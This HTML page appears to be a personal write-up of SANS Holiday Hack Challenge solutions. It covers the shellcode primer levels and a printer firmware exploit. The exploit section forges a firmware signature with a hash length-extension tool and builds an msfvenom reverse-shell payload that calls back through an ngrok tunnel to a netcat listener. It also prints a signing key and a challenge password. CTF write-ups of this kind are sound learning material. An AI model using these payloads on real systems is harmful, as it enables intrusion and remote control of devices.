@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+   <head>
+      <!--This style tag goes in the head of documents needing the fancy video games font.-->
+      <!--The section fonts are specified in the CSS, but each page with the font needs this import-->
+      <style>
+         @import url('https://fonts.googleapis.com/css2?family=Fira+Code&family=Press+Start+2P&display=swap');
+      </style>
+      <meta charset="utf-8">
+      <link rel="icon" type="image/png" sizes="192x192"  href="../icons/android-icon-192x192.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="../icons/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="96x96" href="../icons/favicon-96x96.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="../icons/favicon-16x16.png">
+      <title>HHC Solutions</title>
+      <link rel="stylesheet" href="../styles.css">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+   </head>
+   <body>
+	<div class="wrapper">
+	   <input type="checkbox" id="btn" hidden>
+	   <label for="btn" class="menu-btn">
+	   <i class="fas fa-bars"></i>
+	   <i class="fas fa-times"></i>
+	   </label>
+	   <nav id="sidebar">
+		  <div class="title">
+			 Navigation Menu
+		  </div>
+		  <ul class="list-items">
+			<li><a href="../index.html"><i class="fas fa-home"></i>Home</a></li>
+			<li><a href="../orientation/orientation.html"><i class="fas fa-stream"></i>Orientation</a></li>
+			<li><a href="../the-north-pole/the-north-pole.html"><i class="fas fa-stream"></i>North Pole</a></li>
+			<li><a href="../entry/entry.html"><i class="fas fa-stream"></i>Entry</a></li>
+			<li><a href="../dining-room/dining-room.html"><i class="fas fa-stream"></i>Dining Room</a></li>
+			<li><a href="../great-room/great-room.html"><i class="fas fa-stream"></i>Great Room</a></li>
+			<li><a href="../kitchen/kitchen.html"><i class="fas fa-stream"></i>Kitchen</a></li>
+			<li><a href="../courtyard/courtyard.html"><i class="fas fa-stream"></i>Courtyard</a></li>
+			<li><a href="../talks-lobby/talks-lobby.html"><i class="fas fa-stream"></i>Talks Lobby</a></li>               
+			<li><a href="../speaker-unpreparation-room/speaker-unpreparation-room.html"><i class="fas fa-stream"></i>UNPreparation Room</a></li>
+			<li><a href="../santas-office/santas-office.html"><i class="fas fa-stream"></i>Santa's Office</a></li>
+			<li><a href="../netwars/netwars.html"><i class="fas fa-stream"></i>netwars</a></li>
+			<li><a href="../frost-tower-lobby/frost-tower-lobby.html"><i class="fas fa-stream"></i>Frost Tower Lobby</a></li>
+			<li><a href="../jacks-studio/jacks-studio.html"><i class="fas fa-stream"></i>Jack's Studio</a></li>
+			<li><a href="../jacks-office/jacks-office.html"><i class="fas fa-stream"></i>Jack's Office</a></li>               
+			<li><a href="../jacks-restroom/jacks-restroom.html"><i class="fas fa-stream"></i>Jack's Restroom</a></li>
+			<li><a href="../frost-talks-lobby/frost-talks-lobby.html"><i class="fas fa-stream"></i>Frost Talks Lobby</a></li>
+
+			 <div class="icons">
+				<a href="https://www.facebook.com/clayton.vantol"><i class="fab fa-facebook-f"></i></a>
+				<a href="https://twitter.com/1337VT"><i class="fab fa-twitter"></i></a>
+				<a href="https://www.linkedin.com/in/claytonvantol/"><i class="fab fa-linkedin"></i></a>
+			 </div>
+		  </ul>
+	   </nav>
+	</div>
+	<!-- Contenido aquí. -->
+	<div class="content">
+
+		<div style="margin-left:20%;padding:1px 16px;height:1000px;">
+            <br>
+			<hr class="thick">
+			<br>
+			<videoGameFont>Shellcode Primer</videoGameFont><br>
+			<videoGameSubtitleFont>Computer near Ruby Cyster.</videoGameSubtitleFont><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 1 & 2</videoGameSubtitleFont></p>
+            <p>The first two levels are just to show you how the debugger works and everything.  If I didn't know better, I'd say Jack Frost stole the design of my website.
+				But since the Shellcode Primer was created prior to this website and my design had been implemented before reaching this point in the challenge, I would chalk it up to coincidence that the two designs are very similar.
+				Either that, or the design is simply the easiest and most basic that you can make.  Certainly the case with mine. <img src="lol.png" alt="lol"><img src="lol.png" alt="lol"><br>
+			</p>
+            <img src="shellcode-primer01.PNG" alt="website stolen from me lol"><br>
+            <p></p>
+			<br>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 3</videoGameSubtitleFont></p>
+			<p>Level 3 is the first level in which you actually need to input something.  Simply add a return statement to complete level 3.</p>
+			<br><img src="shellcode-level03.PNG" alt="Easy peasy.  Add a return statement and move on."><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 4</videoGameSubtitleFont></p>
+			<p>There are eight-ish general pupose 64-bit integer registers on amd64.  These are the registers that do that maths.</p>  
+			<term>rax<br>
+			rbx<br>
+			rcx<br>
+			rdx<br>
+			rdi<br>
+			rsi<br>
+			rbp<br>
+			rsp<br>
+			</term>
+			<p>For level 4, we just need to set the rdx register to <term>1337</term>.  The rax register is typically the return value register.  That value is returned when the ret statement is reached.  So we're returning that value.</p>
+			<br><img src="shellcode-level04.PNG" alt="website stolen from me lol"><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 5</videoGameSubtitleFont></p>
+			<p>We need to call <term>sys_exit</term> to exit the process with exit code 99.
+			<a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank">Here is a list of available syscalls on x64</a>. 
+			RTFM* to find it or just check the image below.  
+			<a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank">This</a>
+			 is another resource for finding the library call.
+			
+			</p>
+			<br><img src="shellcode-level05.PNG" alt="read the manual"><br>
+			<br>
+			<p style="font-size: small;">*RTFM - Read The Field Manual or Red Team Field Manual.  Not the other thing.</p>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 6</videoGameSubtitleFont></p>
+			<p>Look at the debugger. Not much to say about this level.</p>
+			<br><img src="shellcode-level06.PNG" alt="easy level"><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 7</videoGameSubtitleFont></p>
+			<p>Level 7 focuses on finding and using the return instruction pointer <term>rip</term> so you can use it to get on Santa's naughty list. Pop the top off the stack and return to where you shouldn't.</p>
+			<br><img src="shellcode-level07.PNG" alt="solution photo"><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<br>
+			<p><videoGameSubtitleFont>Level 8</videoGameSubtitleFont></p>
+			<p>Level 8 goes through the same steps as level 7, but has you return the string "Hello World!" defined as a string of bytes (db - declare bytes).  More on variable declarations in assembly <a href="http://www.tortall.net/projects/yasm/manual/html/nasm-pseudop.html">HERE</a>.</p>
+			<br><img src="shellcode-level08.PNG" alt="solution photo"><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<br>
+			<p><videoGameSubtitleFont>Level 9</videoGameSubtitleFont></p>
+			<p>This level sets up a syscall.  Remember the guide at <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank">this website.</a></p>
+			<br><img src="shellcode-level09.PNG" alt="solution photo"><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<br>
+			<p><videoGameSubtitleFont>Level 10</videoGameSubtitleFont></p>
+			<p>Level 10 focuses on opening a file to read it.  Make sure to use the guide and put the appropriate arguments into the appropriate registers when setting up your syscall.</p>
+			<br><img src="shellcode-level10.PNG" alt="solution photo"><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<p><videoGameSubtitleFont>Level 11</videoGameSubtitleFont></p>
+			<p>Putting it all together in level 11 requires one to <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank">RTFM</a>.  Putting together everything learned in the previous levels will allow you to complete the last one.  The main issues I ran into were the file descriptor, buffer size, and final return statement/syscall.  The final image is that of the debugger eventually showing the contents of the <term>/var/northpolesecrets.txt</term> file in the Stdout section near the top left of the image.  Make sure you speak with Ruby Cyster after completing this challenge to receive some more hints about the printer hacking challenge.</p>
+			<br><img src="shellcode-level11.PNG" alt="wrap it up like a gift"><br>
+			<br>
+			<hr class="thick">
+			<br>
+			<videoGameFont>Printer Exploitation</videoGameFont><br>
+			<videoGameSubtitleFont>Printer kind of near the Shellcode Primer challenge.<br>This is the first actually hard challenge</videoGameSubtitleFont><br>
+			<br>
+			<hr class="thin">
+			<br>
+			<p>First thing on the list is to go grab that hash_extender tool from <a href="https://github.com/iagox86/hash_extender" target="_blank">Ron Bowes' Github page</a>.  On a fresh Kali VM, once you figure out you can't simply use <term>make</term> to build the thing, go download the necessary OpenSSL headers with this command and re-run make: <br><term>sudo apt install libssl-dev</term></p><br>
+			<p>Next, I'll save you some trouble with tunneling the callback from your shellcode.  I didn't realize this part until MUCH MUCH later, but it would be extremely beneficial to do it now and save the headache.  From your Kali VM, head over to <a href="https://ngrok.com/">https://ngrok.com</a> to download their tunneling solution.
+				Unzip the ngrok.zip and connect your account with <br><term>unzip /path/to/ngrok.zip<br>./ngrok authtoken [token in the tutorial]</term><br>  Then fire up ngrok to create your tunnel from a public ngrok server to your private Kali VM. I'll show you how to do that in a moment.</p>
+			<br><p>At this point, you should have done the following:
+				<br>1. hash_extender tool built and ready to use
+				<br>2. setup ngrok account and linked it with the token
+				<br><br>
+				Take a look at the <a href="https://printer.kringlecastle.com/">printer webpage located here</a>. Navigate to the "Firmware Update" page where you'll find an option to download the current firmware.  Once you open the firmware it should look something like this.<br>
+				<br><img src="printerexploit01.PNG" alt="firmware"><br><br>
+				Decode the big base64-encoded string however you would like.  The resulting data has a PK file header typical of a .zip file.  Unzip it to get the actual firmware.bin file, which is just an Executable Linux Format (ELF) file that you can run.<br>
+				<br><img src="printerexploit02.PNG" alt="doing stuff"><br><br>
+				The ELF file just prints out a statement to STDOUT that the firmware was updated and nothing more.  When you're done using <term>gdb</term> for several hours to debug and run all the functions inside the program, you'll probably realize that it does just exactly what I just said.  It just prints a statement.  That's it.
+				You probably also noticed that "signature" and "secret_length" fields in the original JSON data.  These are very important to what we will be doing.  The way the printer "digests" or executes the firmware file is important because you can send it a big ol' JSON string with multiple files in it but only the last file will actually be executed.  HOWEVER, first, the signature must be correct.  This is where hash extender comes in.  Hash_extender appends data to the original file using a known signature, secret and file from the original, it generates a new file with your appended data at the end, a new signature.  All because we know the secret length.
+				The next step you will take is to set up your tunnel with a port of your choosing.  I picked 4545 so run <term>./ngrok tcp 4545</term>.  This outputs something like this to the terminal:<br>
+				<br><img src="printerexploit03.PNG" alt="doing more stuff"><br>
+				Use <br><term>msfvenom -p linux/x64/shell_reverse_tcp LHOST=8.tcp.ngrok.io LPORT=19435 -f elf -e x86\shikata_ga_nai > firmware.bin</term><br> to create your payload.  For LHOST put in the address that ngrok spits out in the previous step when you start up ngrok.  The LPORT is there too.  This zipped payload is what you will be appending to the end of the original good zip file.  <u>Do not forget to <term>chmod +x</term> your payload.</u> After chmod'ing the payload, zip it up so you can add another zip file to your zip file.<br>
+				<br><img src="Xzipit.jpg" alt="Xzipit"><br><br>
+				As X<u>zip</u>it accurately pointed out, and as you've discovered by running <term>file</term> on the zip file in the previous images, the zip file requires the deflate method so just create it with default settings and you'll be fine.  Now, you need to take the newly created zip file which contains your payload and convert that to hexadecimal.  Once you convert it to hex, that big long hex string goes into the "append" portion of the hash_extender command. 
+				<br><br><img src="printerexploit04.PNG" alt="yet more stuff to do"><br><br>
+				The --append [hex] is the zip file we created containing the chmod'ed payload.  The rest of the information is obtained from the original JSON file.
+				<br><br><img src="printerexploit05.PNG" alt="even yet and then more stuff to do"><br><br>
+				This really long "New string:" is the hex we need to convert FROM HEX and INTO BASE64.  The resulting Base64 sting gets put into the original json file along with the new signature generated by the hash_extender program.  Save the file.
+				You have completed your new JSON firmware at this point.  You need to listen for a callback once you upload it to the printer!
+				Just start up a netcat listener with <term>nc -nlvp 4545</term> to listen for incoming connections to 4545.  Your tunnel should forward to that port if that is how you set up ngrok earlier.
+				Upload the json once you start the listener.
+
+				Once your shell pops, <term>cat /var/spool/printer.log</term> to get the document name for the challenge.  There's lots of other stuff in there too.  Take a look around and see what you can find.  This is one random thing in there:
+				<br><br><img src="birdknob.png" alt="birdknob?"><br><br>
+				I think this is the private key for the algorithm used to create the firmware file:<br>
+				Found in <term>/app/lib/app.rb</term><br>
+				<term>SECRET_KEY = 'mybigsigningkey!'</term><br><br>
+				There is a secret endpoint on the webserver also.  That is located at:<br>
+				<a href="https://printer.kringlecastle.com/secretendpointforuptime">https://printer.kringlecastle.com/secretendpointforuptime</a><br>
+				<term>Alabasters secret elf pass: Alabasters secret elf pass: Iw1shi7w@$X-masEv3ryDay\!</term><br><br>
+				This is what was on there at the time I looked initially.  It changes all the time and I have no idea if this is just someone screwing around or an actual hint.  But here it is.
+
+
+
+			</p>
+			<p></p>
+
+        </div>
+    </div>
+    </body>
+  </html>
+  
